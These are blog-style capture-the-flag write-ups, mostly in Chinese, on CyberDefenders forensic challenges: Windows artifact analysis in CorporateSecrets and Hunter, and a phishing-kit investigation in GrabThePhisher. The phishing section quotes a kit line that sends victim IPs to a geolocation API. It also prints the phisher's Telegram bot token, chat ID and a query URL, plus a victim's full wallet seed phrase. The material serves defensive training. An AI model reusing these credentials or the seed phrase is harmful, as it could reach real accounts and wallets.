\\VOLUME{01d60963b1096880-ecb16432}\\WINDOWS\\SYSTEM32\\CFGMGR32.DLL 11: \\VOLUME{01d60963b1096880-ecb16432}\\WINDOWS\\SYSTEM32\\UCRTBASE.DLL 12: \\VOLUME{01d60963b1096880-ecb16432}\\WINDOWS\\SYSTEM32\\SHCORE.DLL 13: \\VOLUME{01d60963b1096880-ecb16432}\\WINDOWS\\SYSTEM32\\COMBASE.DLL 14: \\VOLUME{01d60963b1096880-ecb16432}\\WINDOWS\\SYSTEM32\\BCRYPTPRIMITIVES.DLL 15: \\VOLUME{01d60963b1096880-ecb16432}\\WINDOWS\\SYSTEM32\\WINDOWS.STORAGE.DLL 16: \\VOLUME{01d60963b1096880-ecb16432}\\WINDOWS\\SYSTEM32\\SHLWAPI.DLL 17: \\VOLUME{01d60963b1096880-ecb16432}\\WINDOWS\\SYSTEM32\\GDI32.DLL 18: \\VOLUME{01d60963b1096880-ecb16432}\\WINDOWS\\SYSTEM32\\GDI32FULL.DLL 19: \\VOLUME{01d60963b1096880-ecb16432}\\WINDOWS\\SYSTEM32\\MSVCP_WIN.DLL 20: \\VOLUME{01d60963b1096880-ecb16432}\\WINDOWS\\SYSTEM32\\USER32.DLL 21: \\VOLUME{01d60963b1096880-ecb16432}\\WINDOWS\\SYSTEM32\\WIN32U.DLL 22: \\VOLUME{01d60963b1096880-ecb16432}\\WINDOWS\\SYSTEM32\\KERNEL.APPCORE.DLL 23: \\VOLUME{01d60963b1096880-ecb16432}\\WINDOWS\\SYSTEM32\\POWRPROF.DLL 24: \\VOLUME{01d60963b1096880-ecb16432}\\WINDOWS\\SYSTEM32\\PROFAPI.DLL 25: \\VOLUME{01d60963b1096880-ecb16432}\\WINDOWS\\SYSTEM32\\WS2_32.DLL 26: \\VOLUME{01d60963b1096880-ecb16432}\\$MFT 27: \\VOLUME{01d60963b1096880-ecb16432}\\WINDOWS\\SYSTEM32\\IPHLPAPI.DLL 28: \\VOLUME{01d60963b1096880-ecb16432}\\PROGRAM1\\BROWSER\\TORBROWSER\\TOR\\LIBSSP-0.DLL 29: \\VOLUME{01d60963b1096880-ecb16432}\\PROGRAM1\\BROWSER\\TORBROWSER\\TOR\\LIBEVENT-2-1-6.DLL 30: \\VOLUME{01d60963b1096880-ecb16432}\\PROGRAM1\\BROWSER\\TORBROWSER\\TOR\\ZLIB1.DLL 31: \\VOLUME{01d60963b1096880-ecb16432}\\PROGRAM1\\BROWSER\\TORBROWSER\\TOR\\LIBWINPTHREAD-1.DLL 32: \\VOLUME{01d60963b1096880-ecb16432}\\PROGRAM1\\BROWSER\\TORBROWSER\\TOR\\LIBSSL-1_1-X64.DLL 33: \\VOLUME{01d60963b1096880-ecb16432}\\PROGRAM1\\BROWSER\\TORBROWSER\\TOR\\LIBCRYPTO-1_1-X64.DLL 34: \\VOLUME{01d60963b1096880-ecb16432}\\WINDOWS\\SYSTEM32\\CRYPTSP.DLL 35: \\VOLUME{01d60963b1096880-ecb16432}\\WINDOWS\\SYSTEM32\\RSAENH.DLL 36: \\VOLUME{01d60963b1096880-ecb16432}\\WINDOWS\\SYSTEM32\\BCRYPT.DLL 37: \\VOLUME{01d60963b1096880-ecb16432}\\WINDOWS\\GLOBALIZATION\\SORTING\\SORTDEFAULT.NLS 38: \\VOLUME{01d60963b1096880-ecb16432}\\WINDOWS\\SYSTEM32\\CRYPTBASE.DLL 39: \\VOLUME{01d60963b1096880-ecb16432}\\WINDOWS\\SYSTEM32\\IMM32.DLL 40: \\VOLUME{01d60963b1096880-ecb16432}\\PROGRAM1\\BROWSER\\TORBROWSER\\DATA\\TOR\\TORRC-DEFAULTS 41: \\VOLUME{01d60963b1096880-ecb16432}\\PROGRAM1\\BROWSER\\TORBROWSER\\DATA\\TOR\\TORRC 42: \\VOLUME{01d60963b1096880-ecb16432}\\WINDOWS\\SYSTEM32\\MSWSOCK.DLL 43: \\VOLUME{01d60963b1096880-ecb16432}\\PROGRAM1\\BROWSER\\TORBROWSER\\DATA\\TOR\\STATE 44: \\VOLUME{01d60963b1096880-ecb16432}\\PROGRAM1\\BROWSER\\TORBROWSER\\DATA\\TOR\\CONTROL_AUTH_COOKIE.TMP (Keyword: True) 45: \\VOLUME{01d60963b1096880-ecb16432}\\PROGRAM1\\BROWSER\\TORBROWSER\\DATA\\TOR\\GEOIP 46: \\VOLUME{01d60963b1096880-ecb16432}\\PROGRAM1\\BROWSER\\TORBROWSER\\DATA\\TOR\\GEOIP6 47: \\VOLUME{01d60963b1096880-ecb16432}\\PROGRAM1\\BROWSER\\TORBROWSER\\DATA\\TOR\\CACHED-CERTS 48: \\VOLUME{01d60963b1096880-ecb16432}\\WINDOWS\\SYSTEM32\\EN-US\\KERNELBASE.DLL.MUI 49: \\VOLUME{01d60963b1096880-ecb16432}\\PROGRAM1\\BROWSER\\TORBROWSER\\DATA\\TOR\\CACHED-MICRODESC-CONSENSUS 50: \\VOLUME{01d60963b1096880-ecb16432}\\PROGRAM1\\BROWSER\\TORBROWSER\\DATA\\TOR\\CACHED-MICRODESCS 51: \\VOLUME{01d60963b1096880-ecb16432}\\PROGRAM1\\BROWSER\\TORBROWSER\\DATA\\TOR\\CACHED-MICRODESCS.NEW 52: \\VOLUME{01d60963b1096880-ecb16432}\\PROGRAM1\\BROWSER\\TORBROWSER\\DATA\\TOR\\UNVERIFIED-MICRODESC-CONSENSUS 53: \\VOLUME{01d60963b1096880-ecb16432}\\PROGRAM1\\BROWSER\\TORBROWSER\\DATA\\TOR\\STATE.TMP (Keyword: True) 54: \\VOLUME{01d60963b1096880-ecb16432}\\WINDOWS\\SYSTEM32\\NSI.DLL 55: \\VOLUME{01d60963b1096880-ecb16432}\\WINDOWS\\SYSTEM32\\DHCPCSVC6.DLL 56: \\VOLUME{01d60963b1096880-ecb16432}\\WINDOWS\\SYSTEM32\\DHCPCSVC.DLL 57: \\VOLUME{01d60963b1096880-ecb16432}\\PROGRAM1\\BROWSER\\TORBROWSER\\DATA\\TOR\\CACHED-MICRODESC-CONSENSUS.TMP (Keyword: True) ---------- Processed TOR.EXE-4B50033F.pf in 0.04772100 seconds ---------- :::\n:::spoiler Flag Flag: 2 :::\n==Q24== # There is a png photo of an iPhone in Grapes\u0026rsquo;s files. Find it and provide the SHA-1 hash.\nRecon # 看了第一個hint才知道有stego的成分在裡面，首先要找到藏圖片的檔案是哪一張，我判斷是samplePhone.jpg這一張\nExploit # 有了圖片之後就是最擅長的misc基本操作，結果在binwalk的時候發現有附加檔案在裡面，就直接foremost提出來\n$ binwalk -e samplePhone.jpg DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 5962 0x174A PNG image, 1000 x 1000, 8-bit/color RGBA, non-interlaced 6003 0x1773 Zlib compressed data, best compression $ foremost -v samplePhone.jpg Foremost version 1.5.7 by Jesse Kornblum, Kris Kendall, and Nick Mikus Audit File Foremost started at Tue Nov 7 01:32:54 2023 Invocation: foremost -v samplePhone.jpg Output directory: /mnt/d/NTU/CTF/CyberDefenders/CorporateSecrets/Exported File/output Configuration file: /etc/foremost.conf Processing: samplePhone.jpg |------------------------------------------------------------------ File: samplePhone.jpg Start: Tue Nov 7 01:32:54 2023 Length: 164 KB (167947 bytes) Num Name (bs=512) Size File Offset Comment 0: 00000011.png 158 KB 5962 (1000 x 1000) *| Finish: Tue Nov 7 01:32:54 2023 1 FILES EXTRACTED png:= 1 ------------------------------------------------------------------ Foremost finished at Tue Nov 7 01:32:54 2023 $ cd output/png $ file * 00000011.png: PNG image data, 1000 x 1000, 8-bit/color RGBA, non-interlaced :::info 也可以像1直接用$ binwalk --dd=\u0026quot;.*\u0026quot; samplePhone.jpg，一樣可以解壓縮出原本的圖片 :::\n:::spoiler Flag Flag: 537fe19a560ba3578d2f9095dc2f591489ff2cde :::\n==Q25== # When was the last time a docx file was opened on the device? (An apple a day keeps the docx away. Answer in UTC, YYYY-MM-DD HH:MM:SS)\nRecon # 我原本的直覺是想可以parse $MFT或是該檔案的lnk去看他的改動時間，但很不幸的MFT沒有這筆資料(?)，另外也沒有lnk檔案，所以只能通靈，以下解題過程是參考解完的hint\nExploit # 直接看RecentDocs的資訊就找的到了，該紀錄在Jim的NTUSER.DAT中，Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs :::spoiler Flag Flag: 2020-04-11 23:23:36 :::\n==Q26== # How many entries does the MFT of the filesystem have?\nExploit # 我是直接在/root的地方export出$MFT file，然後去看magic header(FILE0)的數量有多少(219811)，但這樣不準確(不清楚為甚麼)，我記得之前@Jimmy說過\n$MFT長度一段就是1024 Bytes(0x400)\n所以我想說可以把最後出現的位置除已0x400可能就是答案$\\to 0xd6aac00/0x400=219819.0$ 方法一 不過以上的方法是確實可行的，因為計算entries不是只要看有多少有紀錄的File，而是整個$MFT有多少空間，意思是我們要看最後位址是多少再除以0x400，而不是只算到最後一個FILE0的地方就直接除已0x400 該檔案的最後位址是在0xd6bfff0 $(0xd6bfff0+0x10)/0x400 = 219904.0$ 加上0x10是因為要算出完整的0x400才算一個，也就是我們要算最後一個就要padding 方法二 後來參考1才知道比較正確的解法 clone mftdump create python 2 environment dump mft file $ conda activate py27 $ python mftdump.py \u0026#34;MFT\u0026#34; \u0026gt; MFTdumpOutput.txt 看解出多少entries再扣掉最前面兩行不算的部分 $219906-2=219904$ :::spoiler Flag Flag: 219904 :::\n==Q27== # Tim wanted to fire an employee because they were \u0026hellip;\u0026hellip;?(Be careful what you wish for)\nExploit # 呈第15題，直接看Tim的瀏覽紀錄就會知道了\n:::spoiler Flag Flag: stinky :::\nReference # CyberDefenders: CorporateSecrets\u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":75,"href":"/security/practice/cyberdefender/endpoint-forensic/corporatesecrets---medium/cyberdefender---corporatesecrets-part-4/","title":"CyberDefender - CorporateSecrets (Part 4)","section":"Securities","content":" CyberDefender - CorporateSecrets (Part 4) # Challenge: https://cyberdefenders.org/blueteam-ctf-challenges/33 Part 1: https://hackmd.io/@SBK6401/r18z7VIm6 Part 2: https://hackmd.io/@SBK6401/ByFhEE8X6 Part 3: https://hackmd.io/@SBK6401/HyHp4NLQT\n:::spoiler TOC [TOC] :::\nTools: # FTK Imager Registry Explorer RegRipper HxD DB Browser for SQLite HindSight Event Log Explorer MFTDump ==Q28== # What cloud service was a Startup item for the user admin?\nRecon # 直接看admin的NTUSER.DAT中的./Software/Microsoft/Windows/CurrentVersion/Run就可以了\nExploit # :::spoiler Flag Flag: OneDrive :::\n==Q29== # Which Firefox prefetch file has the most runtimes? (Flag format is )\nExploit # 直接export出和firefox有關的prefetch file，再用PECmd去parse他就可以看到各個執行檔執行的次數\n$ ./PECmd.exe -f FIREFOX\\ INSTALLER.EXE-71BB164E.pf | grep \u0026#34;Run count\u0026#34; Run count: 1 $ ./PECmd.exe -f FIREFOX.EXE-20153F0F.pf | grep \u0026#34;Run count\u0026#34; Run count: 10 $ ./PECmd.exe -f FIREFOX.EXE-A606B53C.pf | grep \u0026#34;Run count\u0026#34; Run count: 21 $ ./PECmd.exe -f FIREFOX.EXE-B4420372.pf | grep \u0026#34;Run count\u0026#34; Run count: 4 $ ./PECmd.exe -f FIRSTLOGONANIM.EXE-674CDAB9.pf | grep \u0026#34;Run count\u0026#34; Run count: 1 :::spoiler Flag Flag: FIREFOX.EXE-A606B53C.pf/21 :::\n==Q30== # What was the last IP address the machine was connected to?\nExploit # 直接看SYSTEM/ControlSet001/Services/Tcpip/Parameters/Interfaces/ :::spoiler Flag Flag: 192.168.2.242 :::\n==Q31== # Which user had the most items pinned to their taskbar?\nRecon # 這一題也是新的觀念，taskbar items會在C:\\Users\\USERNAME\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\nExploit # admin jim.tomato hansel.apricot miriam.grapes suzy.strawberry :::spoiler Flag Flag: admin :::\n==Q32== # What was the last run date of the executable with an MFT record number of 164885? (Format: MM/DD/YYYY HH:MM:SS (UTC).)\nRecon # 直覺會看第26題用mftdump的結果，然後去看164885的offset address，再去看$MFT的timestamp，不過後來想想，$MFT的timestamp所記錄的是Creat Time + Modified Time + $MFT Modified Time + Access Time，並不是最後執行的timestamp，所以應該是去看是哪一個檔案，然後去看他的prefetch file\nExploit # Record No. 164885 $\\to$ 0x0a105400 7zG.exe Export Prefetch Parse Prefetch File $ ./PECmd.exe -f 7ZG.EXE-0F8C4081.pf | grep \u0026#34;Last run\u0026#34; Last run: 2020-04-12 02:32:09 :::spoiler Flag Flag: 04/12/2020 02:32:09 :::\n==Q33== # What is the log file sequence number for the file \u0026ldquo;fruit_Assortment.jpg\u0026rdquo;?\nRecon # 這也是一個新觀念，log file sequence number就是在$MFT的magic header(FILE0)的後面(SO=8, LE=8)，並且倒著看再轉換成十進制就可以了，當然也可以直接用像MFTEcmd這樣的parser\nExploit # \u0026gt;\u0026gt;\u0026gt; num = \u0026#39;60 BA 1A 4C 00 00 00 00\u0026#39; \u0026gt;\u0026gt;\u0026gt; int(\u0026#34;\u0026#34;.join(num.split(\u0026#39; \u0026#39;)[::-1]), 16) 1276820064 :::spoiler Flag Flag: 1276820064 :::\n==Q34== # Jim has some dirt on the company stored in a docx file. Find it, the flag is the fourth secret, in the format of \u0026lt;\u0026ldquo;The flag is a sentence you put in quotes\u0026rdquo;\u0026gt;. (Secrets, secrets are no fun)\nRecon # 這一題很複雜，一開始想說是類似docx forensics的這種CTF類型，所以找了一下其他的.docx files\nExploit # Search .docx Files 從recycle bin中可以看到Jim的SID(1003)有丟棄一些docx file的痕跡，直接把這些file export出來 一番操作之後都沒有甚麼結果，所以就參考1的作法，和之前的經驗，先把extension改成zip，然後解壓縮他 再把./Document1/Content.xml用Microsoft Word開啟，就可以看到主要的內容了，這神奇的操作也是第一次看到 :::spoiler Flag Flag: Customer data is not stored securely :::\n==Q35== # In the company Slack, what is threatened to be deactivated if the user gets their email deactivated?\nRecon # Exploit # 我覺得1解法比較有效率，不然慢慢找真的會瘋掉\n先找到有誰使用slack這套軟體，因為之前在寫前面的東西的時候就翻到了，所以可以參考就好 $ find . -type d -name \u0026#39;Slack\u0026#39; ./Users/hansel.apricot/AppData/Roaming/Slack 接著看有沒有和題目相關的字眼 $ grep -r -i \u0026#39;deactivate\u0026#39; ./Users/hansel.apricot/AppData/Roaming/Slack \u0026gt; grep_deactivate.txt 看哪一個file有和deactivate有關係，前面一大段是Cache就不用理他 可以看到應該是./Users/hansel.apricot/AppData/Roaming/Slack/IndexedDB/https_app.slack.com_0.indexeddb.leveldb/000003.log matches比較符合 直接strings search $ strings ./Users/hansel.apricot/AppData/Roaming/Slack/IndexedDB/https_app.slack.com_0.indexeddb.leveldb/000003.lo g | grep text \u0026gt; log_dump.txt 仔細看其中的內容，看來看去kneecaps應該就是答案，但我不確定這一題到底在幹嘛，或者說出題意義不明 text\u0026#34;5And so do your kneecaps, well, as much as they do now{ :::spoiler Flag Flag: kneecaps :::\nReference # CyberDefenders: CorporateSecrets\u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":76,"href":"/security/practice/cyberdefender/threat-intel/cyberdefender---grabthephisher/","title":"CyberDefender - GrabThePhisher","section":"Securities","content":" CyberDefender - GrabThePhisher # Challenge: https://cyberdefenders.org/blueteam-ctf-challenges/95\n:::spoiler TOC [TOC] :::\nScenario # An attacker compromised a server and impersonated https://pancakeswap.finance/, a decentralized exchange native to BNB Chain, to host a phishing kit at https://apankewk.soup.xyz/mainpage.php. The attacker set it as an open directory with the file name \u0026ldquo;pankewk.zip\u0026rdquo;.\nProvided the phishing kit, you as a soc analyst are requested to analyze it and do your threat intel homework.\n==Q1== # Which wallet is used for asking the seed phrase?\nRecon # 從scenario就可以知道他大概是一個網站被攻擊後盜用，轉變成用來騙別人的釣魚網站，因此可以看一下整體的資料夾結構會發現他所採用的錢包就是metamask\n:::spoiler Flag Flag: Metamask :::\n==Q2== # What is the file name that has the code for the phishing kit?\nRecon # 同上，只要觀察資料夾結構就可以知道有一個file叫做metamask.php\n:::spoiler Flag Flag: metamask.php :::\n==Q3== # In which language was the kit written?\nRecon # 同上\n:::spoiler Flag Flag: php :::\n==Q4== # What service does the kit use to retrieve the victim\u0026rsquo;s machine information?\nRecon # 這個就比較有趣一點，通常問的應該是哪一個api之類的服務，所以應該要往這個方向想，看了一下matamask.php，裡面有提到\n$request = file_get_contents(\u0026#34;http://api.sypexgeo.net/json/\u0026#34;.$_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]); 代表他所使用的應該是Sypex Geo這個service，查了一下，可以看一下github repo，的確就像題目敘述一樣是可以藉由IP取得受害者機器的一些相關訊息\n:::spoiler Flag Flag: Sypex Geo :::\n==Q5== # How many seed phrases were already collected?\nRecon # 我是直接看/log/log.txt的內容發現有三行，且每一行都有固定12個phrase，所以我猜應該已經取得三個受害電腦的seed phrase\n:::spoiler Flag Flag: 3 :::\n==Q6== # Write down the seed phrase of the most recent phishing incident?\nExploit # 同上，把最後一列的seed phrase貼上就對了\n:::spoiler Flag Flag: father also recycle embody balance concert mechanic believe owner pair muffin hockey :::\n==Q7== # Which medium had been used for credential dumping?\nRecon # 如果仔細看metamask.php的後半段會發現他還有call到telegram的API，主要用途是拿取seed phrase，再把這些東西append到/log/log.txt中\n:::spoiler Flag Flag: telegram :::\n==Q8== # What is the token for the channel?\nRecon # 同上\n:::spoiler Flag Flag: 5457463144:AAG8t4k7e2ew3tTi0IBShcWbSia0Irvxm10 :::\n==Q9== # What is the chat ID of the phisher\u0026rsquo;s channel?\nExploit # 同上\n:::spoiler Flag Flag: 5442785564 :::\n==Q10== # What are the allies of the phish kit developer?\nExploit # 可以從註解當中看到j1j1b1s@m3r0這個人應該也有提供一些協助\n:::spoiler Flag Flag: j1j1b1s@m3r0 :::\n==Q11== # What is the full name of the Phish Actor?\nExploit # 如果把檔案中提供的token/id當作TG的parameter會得到甚麼東西呢?$\\to$https://api.telegram.org/bot5457463144:AAG8t4k7e2ew3tTi0IBShcWbSia0Irvxm10/getChat?chat_id=5442785564\n:::spoiler Flag Flag: Marcus Aurelius :::\n==Q12== # What is the username of the Phish Actor?\nExploit # 同上\n:::spoiler Flag Flag: pumpkinboii :::\nReference # A walkthrough of CyberDefenders “GrabThePhisher — Threat intel” CTF\n"},{"id":77,"href":"/security/practice/cyberdefender/endpoint-forensic/hunter---medium/cyberdefender---hunter-part-1/","title":"CyberDefender - Hunter (Part 1)","section":"Securities","content":" CyberDefender - Hunter (Part 1) # Challenge: https://cyberdefenders.org/blueteam-ctf-challenges/32 Part 2: https://hackmd.io/@SBK6401/HJlmeuwfT Part 3: https://hackmd.io/@SBK6401/HylP8ixQp\n:::spoiler TOC [TOC] :::\nScenario # The SOC team got an alert regarding some illegal port scanning activity coming from an employee\u0026rsquo;s system. The employee was not authorized to do any port scanning or any offensive hacking activity within the network. The employee claimed that he had no idea about that, and it is probably a malware acting on his behalf. The IR team managed to respond immediately and take a full forensic image of the user\u0026rsquo;s system to perform some investigations.\nThere is a theory that the user intentionally installed illegal applications to do port scanning and maybe other things. He was probably planning for something bigger, far beyond a port scanning!\nIt all began when the user asked for a salary raise that was rejected. After that, his behavior was abnormal and different. The suspect is believed to have weak technical skills, and there might be an outsider helping him!\nYour objective as a soc analyst is to analyze the image and to either confirm or deny this theory.\nTools # AccessData FTK Imager Registry Explorer\n==Q1== # What is the computer name of the suspect machine?\nRecon # 首先看到題目給的檔案就知道他是用FTK Access Data輸出的檔案，所以先用FTK觀察裡面的一些資料\nExploit # 如果要知道電腦名稱，可以先從/root/Windows/System32/config/中找到SYSTEM這個檔案，它裡面紀錄了很多registry 其中有一個叫做computer name就紀錄本機器的名稱，先把該檔案export出來，再利用registry explorer看裡面的東西，就在/ControlSet001/Control/ComputerName/ComputerName 其實這個檔案就對應到自己電腦中的電腦\\HKEY_LOCAL_MACHINE\\SYSTEM這個檔案，也可以在依照原本的路徑找到自己電腦的名稱 :::spoiler Flag Flag: 4ORENSICS :::\n==Q2== # What is the computer IP?\nExploit # 在同樣的檔案也可以找到這個資訊，就在\\ControlSet001\\Services\\Tcpip\\Parameters\\Interfaces\\中可以看到這一題的答案是DhcpIPAddress=10.0.2.15 如果在自己的電腦看得話，也可以找到一樣的東西，不過數量有點多，是因為我有裝VMware/VirtualBox/WSL，而每一個都有自己對應的虛擬網卡，就會需要很多不同的機碼，可以搭配command的ipconfig :::spoiler 和自己電腦做對照 :::\n:::spoiler Flag Flag: 10.0.2.15 :::\n==Q3== # What was the DHCP LeaseObtainedTime?\nRecon # 我們知道DHCP會固定一段時間就換掉來request的機器的IP，所以就會有\u0026quot;租約\u0026quot;的概念出現，當一台電腦像DHCP server請求一個IP，則除了會拿到一組動態IP之外，也會拿到一個租約開始與結束的時間，則下一次該機器向server請求時會判斷目前時間是不是在租約的範圍中，若不是就會換到下一個IP\nExploit # 也是在同樣的Hive file就可以看到相關的訊息，轉換的方式很簡單，可以直接用datatime這個library或是用線上工具，參數就在\\ControlSet001\\Services\\Tcpip\\Parameters\\Interfaces\\ \u0026gt;\u0026gt;\u0026gt; time = 1466475852 \u0026gt;\u0026gt;\u0026gt; date_time = datetime.datetime.fromtimestamp(time) \u0026gt;\u0026gt;\u0026gt; date_time.strftime(\u0026#39;%d/%m/20%y \u0026#39; + \u0026#39;{0:0\u0026gt;2d}\u0026#39;.format(int(date_time.strftime(\u0026#39;%H\u0026#39;)) - 8) + \u0026#39;:%M:%S\u0026#39; + \u0026#39; UTC\u0026#39;) \u0026#39;21/06/2016 02:24:12 UTC\u0026#39; \u0026gt;\u0026gt;\u0026gt; date_time = datetime.datetime.fromtimestamp(time) \u0026gt;\u0026gt;\u0026gt; date_time.strftime(\u0026#39;%d/%m/20%y \u0026#39; + \u0026#39;{0:0\u0026gt;2d}\u0026#39;.format(int(date_time.strftime(\u0026#39;%H\u0026#39;)) - 8) + \u0026#39;:%M:%S\u0026#39; + \u0026#39; UTC\u0026#39;) \u0026#39;22/06/2016 02:24:12 UTC\u0026#39; 可以看到租約開始的時間是6/21，而到期日是在6/22， :::spoiler 和自己的電腦對照\n\u0026gt;\u0026gt;\u0026gt; time = 1698209088 \u0026gt;\u0026gt;\u0026gt; date_time = datetime.datetime.fromtimestamp(time) \u0026gt;\u0026gt;\u0026gt; date_time.strftime(\u0026#39;%d/%m/20%y \u0026#39; + \u0026#39;{0:0\u0026gt;2d}\u0026#39;.format(int(date_time.strftime(\u0026#39;%H\u0026#39;)) - 8) + \u0026#39;:%M:%S\u0026#39; + \u0026#39; UTC\u0026#39;) \u0026#39;25/10/2023 04:44:48 UTC\u0026#39; \u0026gt;\u0026gt;\u0026gt; time = 1698295488 \u0026gt;\u0026gt;\u0026gt; date_time = datetime.datetime.fromtimestamp(time) \u0026gt;\u0026gt;\u0026gt; date_time.strftime(\u0026#39;%d/%m/20%y \u0026#39; + \u0026#39;{0:0\u0026gt;2d}\u0026#39;.format(int(date_time.strftime(\u0026#39;%H\u0026#39;)) - 8) + \u0026#39;:%M:%S\u0026#39; + \u0026#39; UTC\u0026#39;) \u0026#39;26/10/2023 04:44:48 UTC\u0026#39; :::\n:::spoiler Flag Flag: 21/06/2016 02:24:12 UTC :::\n==Q4== # What is the computer SID?\nBackground # 深入了解安全性識別碼(SID Deep Dive)\nRecon # 可以先了解SID在幹嘛，然後這個基碼是儲存在SOFTWARE中，所以可以先dump出來\nExploit # 在\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\，同樣的，SOFTWARE也是對應到自己電腦的電腦\\HKEY_LOCAL_MACHINE\\SOFTWARE :::spoiler 和自己電腦做對照 利用psGetSid.exe這個微軟提供的工具可以知道自己這一台電腦(帳號)的SID為何\n$ PsGetsid.exe PsGetSid v1.46 - Translates SIDs to names and vice versa Copyright (C) 1999-2023 Mark Russinovich Sysinternals - www.sysinternals.com SID for \\\\BERNIE-DESKTOP: S-1-5-21-1994825736-962948173-1409654112 :::\n:::spoiler Flag Flag: S-1-5-21-2489440558-2754304563-710705792 :::\n==Q5== # What is the Operating System(OS) version?\nExploit # 在\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion中可以看到 :::spoiler Flag Flag: 8.1 :::\n==Q6== # What was the computer timezone?\nExploit # 主要是在\\SYSTEM\\ControlSet001\\Control\\TimeZoneInformation中，可以看到他的時區是Pacific Standard Time，根據時區換算的說明，有兩種轉換若有考慮夏令時間就是UTC-7，如果沒有就是UTC-8 :::spoiler 和自己的電腦照 可以看到是Taipei Standard Time，也就是UTC+08:00 :::\n:::spoiler Flag Flag: UTC-07:00 :::\n==Q7== # How many times did this user log on to the computer?\nBackground # 二刀流Windows日誌分析　精準掌握資安蛛絲馬跡\nEvent Log在/root/Windows/System32/winevt/Logs/中 Recon # 看到題目需要知道使用者操作，直覺會想到稽核的log紀錄，所以可以先把evtx檔案dump出來\nExploit # 原本想說要用logontracer，有美美的GUI好香，但實際用過之後不僅一大堆問題，包括安裝環境和內部source code的瑕疵，重點是還不給我parse，連正常運作都不給用，詳細安裝說明、遇到的問題以及為甚麼不給parse可以看我寫的這一篇，所以還是乖乖用內建的或是像1一樣先把evtx檔案用EvtxECmd轉成csv檔案再用timeline explorer篩選各種event，不得不說，timeline explorer是真的好用，設定各種filter跟喝水一樣簡單\n$ EvtxECmd.exe -f Security.evtx --csv out 用timeline explorer觀察一下整體的payload，會發現#text就是前面找到的SID，所以我們的filter自然就可以先設定Hunter這個username，然後我也不知道為啥，event ID的filter居然不是設定4624，而是設定4672，查了一下MSDN，看起來應該是一個具有更高權限的登入紀錄，不過我還是覺得這一題出的不好，因為如果只是單單看logon的次數，用4624也說得通 :::spoiler Flag Flag: 3 :::\n==Q8== # When was the last login time for the discovered account? Format: one-space between date and time\nExploit # 呈上題 :::spoiler Flag Flag: 2016-06-21 01:42:40 :::\n==Q9== # There was a “Network Scanner” running on this computer, what was it? And when was the last time the suspect used it? Format: program.exe,YYYY-MM-DD HH:MM:SS UTC\nRecon # 題目要求要找一個類似nmap之類的掃port的工具，然後還要看最後一次使用的時間，所以要先找到該軟體再哪裡，思路應該是既然他有使用過就一定會有prefetch，所以可以從裡面撈點東西出來這樣，位置就在\\root\\Windows\\Prefetch\nExploit # 首先從這一大堆的prefetch中看有哪一個工具很可疑，發現zenmap.exe的pf感覺有點熟悉，查了一下，原來是nmap的近親(有視覺化功能)，看起來就是他了，接著又是使用新工具的時候，到這邊載PECmd，(Eric Zimmerman很屌耶，甚麼工具都有做)，下command就會出現Last run的時間了\n$ PECmd.exe -f ZENMAP.EXE-56B17C4C.pf PECmd version 1.5.0.0 Author: Eric Zimmerman (saericzimmerman@gmail.com) https://github.com/EricZimmerman/PECmd Command line: -f ZENMAP.EXE-56B17C4C.pf --csv output Warning: Administrator privileges not found! Keywords: temp, tmp Processing ZENMAP.EXE-56B17C4C.pf Created on: 2023-10-25 17:04:39 Modified on: 2016-06-21 12:08:21 Last accessed on: 2023-10-25 17:05:58 Executable name: ZENMAP.EXE Hash: 56B17C4C File size (bytes): 93,524 Version: Windows 8.0, Windows 8.1, or Windows Server 2012(R2) Run count: 1 Last run: 2016-06-21 12:08:13 Volume information: ... :::spoiler Flag Flag: zenmap.exe,2016-06-21 12:08:13 UTC :::\n==Q10== # When did the port scan end? (Example: Sat Jan 23 hh:mm:ss 2016)\nRecon # 如果有用過nmap這種工具應該會有一個log file或是最後結果的report，所以直覺應該是找到個這file，但\u0026hellip;我不知道去哪裡找，所以求助大神的WP2 在上一題的結果中，我們會發現一些可疑的資料夾或是檔案，例如:\n24: \\DEVICE\\HARDDISKVOLUME2\\USERS\\HUNTER\\.ZENMAP 93: \\DEVICE\\HARDDISKVOLUME2\\USERS\\HUNTER\\.ZENMAP\\SCAN_PROFILE.USP 95: \\DEVICE\\HARDDISKVOLUME2\\USERS\\HUNTER\\.ZENMAP\\ZENMAP.CONF 97: \\DEVICE\\HARDDISKVOLUME2\\USERS\\HUNTER\\.ZENMAP\\ZENMAP_VERSION 其他可能有一些原因導致資料遺失，所以感覺上這個路徑會有一些資訊可以撈 大概看過一遍之後發現他的target是scanme.nmap.org，結果的路徑會放在recent_scans.txt中$\\to$C:\\Users\\Hunter\\Desktop\\nmapscan.xml，實際去翻了一下發現真的有一些重要資訊\nExploit # :::spoiler xml檔案內容\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;iso-8859-1\u0026#34;?\u0026gt; \u0026lt;?xml-stylesheet href=\u0026#34;file:///C:/Program Files (x86)/Nmap/nmap.xsl\u0026#34; type=\u0026#34;text/xsl\u0026#34;?\u0026gt;\u0026lt;nmaprun start=\u0026#34;1466511043\u0026#34; profile_name=\u0026#34;\u0026#34; xmloutputversion=\u0026#34;1.04\u0026#34; scanner=\u0026#34;nmap\u0026#34; version=\u0026#34;7.12\u0026#34; startstr=\u0026#34;Tue Jun 21 05:10:43 2016\u0026#34; args=\u0026#34;nmap -T4 -A -v scanme.nmap.org\u0026#34;\u0026gt;\u0026lt;scaninfo 